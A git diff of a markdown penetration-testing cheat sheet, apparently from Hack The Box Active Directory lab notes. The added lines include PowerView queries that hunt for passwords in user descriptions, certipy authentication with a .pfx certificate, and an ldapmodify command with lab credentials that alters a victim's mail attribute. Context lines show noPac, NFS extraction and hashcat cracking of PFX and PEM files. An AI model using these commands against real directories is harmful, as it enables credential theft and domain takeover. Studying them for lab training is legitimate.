@@ -57,6 +57,22 @@ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclas
 ```
 {% endcode %}
 
+### <mark style="color:blue;">Password in Description Field</mark>
+
+{% code overflow="wrap" %}
+```powershell
+PS C:\htb> Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
+```
+{% endcode %}
+
+### <mark style="color:blue;">PASSWD\_NOTREQD Field</mark>
+
+{% code overflow="wrap" %}
+```powershell
+PS C:\htb> Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
+```
+{% endcode %}
+
 ***
 
 ## <mark style="color:red;">**Password Spraying**</mark>
@@ -483,7 +499,7 @@ $ sudo python3 noPac.py inlanefreight.local/user:password -dc-ip 172.16.5.5 \
 
 ## <mark style="color:red;">NFS Exploitation</mark>
 
-#### 📂 Basic Operations
+#### <mark style="color:green;">📂 Basic Operations</mark>
 
 ```bash
 # List NFS exports
@@ -504,7 +520,7 @@ mount | grep nfs
 sudo umount /mnt/nfs_target
 ```
 
-#### 📥 File Extraction
+#### <mark style="color:green;">📥 File Extraction</mark>
 
 ```bash
 # Copy all files from NFS to local
@@ -522,7 +538,7 @@ sudo chown -R $(whoami):$(whoami) ./*
 chmod 600 *
 ```
 
-#### 🔍 Enumerate NFS permissions
+#### <mark style="color:green;">🔍 Enumerate NFS permissions</mark>
 
 ```bash
 # Check file ownership and permissions
@@ -539,7 +555,7 @@ mount | grep nfs | grep /mnt/nfs_target
 
 ## <mark style="color:red;">Certificate Operations</mark>
 
-#### 🔐 PFX Password Cracking
+#### <mark style="color:green;">🔐 PFX Password Cracking</mark>
 
 **Extract hash from PFX**
 
@@ -586,7 +602,7 @@ hashcat --session=pfx_crack -m 24420 hash.txt rockyou.txt
 hashcat --session=pfx_crack --restore
 ```
 
-#### 🔑 PEM Key Cracking
+#### <mark style="color:green;">🔑 PEM Key Cracking</mark>
 
 **Extract hash from encrypted PEM**
 
@@ -612,7 +628,7 @@ hashcat baker_clean.hash rockyou.txt
 john --wordlist=rockyou.txt baker.hash
 ```
 
-#### 📜 Certificate Information Extraction
+#### <mark style="color:green;">📜 Certificate Information Extraction</mark>
 
 **Read certificate (.crt)**
 
@@ -642,7 +658,7 @@ openssl pkcs12 -in cert.pfx -info -passin pass:password
 openssl pkcs12 -in cert.pfx -info -passin pass:  # Empty password
 ```
 
-#### 🔄 Certificate Conversion
+#### <mark style="color:green;">🔄 Certificate Conversion</mark>
 
 **Extract from PFX**
 
@@ -697,7 +713,15 @@ openssl rsa -in encrypted.key -out decrypted.key
 # Enter passphrase when prompted
 ```
 
-#### 📊 Certificate Serial Number Operations
+#### <mark style="color:green;">Auth with .pfx file</mark>
+
+{% code overflow="wrap" expandable="true" %}
+```shellscript
+oxdf@hacky$ certipy auth -pfx baker.pfx -dc-ip 10.10.11.65
+```
+{% endcode %}
+
+#### <mark style="color:green;">Certificate Serial Number Operations</mark>
 
 **Extract serial number**
 
@@ -772,7 +796,7 @@ echo "X509:<I>$ISSUER<SR>$SERIAL"
 
 ## <mark style="color:red;">Kerberos Setup</mark>
 
-#### ⚙️ krb5.conf Configuration
+#### <mark style="color:green;">⚙️ krb5.conf Configuration</mark>
 
 **Generate with NetExec**
 
@@ -847,7 +871,7 @@ EOF
 export KRB5_CONFIG="$PWD/custom_krb5.conf"
 ```
 
-#### 🕐 Time Synchronization
+#### <mark style="color:green;">🕐 Time Synchronization</mark>
 
 **Sync with DC**
 
@@ -902,7 +926,7 @@ faketime "$(ntpdate -q dc01.scepter.htb | grep server | head -n1 | awk '{print $
     certipy auth -pfx cert.pfx -dc-ip <DC_IP>
 ```
 
-#### 🎫 Ticket Operations
+#### <mark style="color:green;">🎫 Ticket Operations</mark>
 
 **List tickets**
 
@@ -1180,6 +1204,17 @@ $inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]
 $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($identity, $adRights, $type, $inheritanceType)
 $acl.AddAccessRule($rule)
 Set-Acl -Path "AD:\$objectDN" -AclObject $acl
+```
+
+#### Change Email
+
+```
+ldapmodify -x -D 'a.carter@scepter.htb' -w 'P@$$word123!' -H 'ldap://dc01.scepter.htb'<<EOF
+dn: CN=D.BAKER,OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB
+changetype: modify
+add: mail
+mail: h.brown@scepter.htb
+EOF
 ```
 
 ***
